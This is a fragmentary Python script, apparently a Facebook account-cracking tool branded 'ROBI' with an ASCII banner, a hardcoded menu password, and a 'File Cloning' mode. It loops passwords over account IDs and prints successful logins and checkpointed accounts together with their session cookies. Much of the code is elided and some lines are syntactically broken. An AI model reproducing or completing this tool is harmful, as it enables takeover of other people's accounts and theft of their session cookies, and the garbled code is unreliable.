...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mROBI')
...
while attemps < 12345677901:
    ...
    if username == 'ROBI' and password == 'FIRE':
...
`7MM"""Mq.   .g8""8q. `7MM"""Yp, `7MMF'
  MM   `MM..dP'    `YM. MM    Yb   MM  
  MM   ,M9 dM'      `MM MM    dP   MM  
  MMmmdM9  MM        MM MM"""bg.   MM  
  MM  YM.  MM.      ,MP MM    `Y   MM  
  MM   `Mb.`Mb.    ,dP' MM    ,9   MM  
.JMML. .JMM. `"bmmd"' .JMMmmmd9  .JMML.
                                       
                                       

\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • SOHAG HOSSAIN ROBI  FIRE (🥰)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [ 0.1 ] FIRE (😻)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
	ROBIj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	ROBIj('\033[0;97m===============================================')
	ROBI= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if ROBI in ['m']:
		public()
	elif ROBI in ['1']:
		crack_file()
		...
		os.system(https://www.facebook.com/profile.php?id=100089590255979&mibextid=ZbWKwL' ')
	elif ROBI in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#ROBI-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•ROBI-Cp💔] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#ROBI-King
				print(f'\r\033[0;92m[ROBI-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " ROBI,  Ok,  id"')
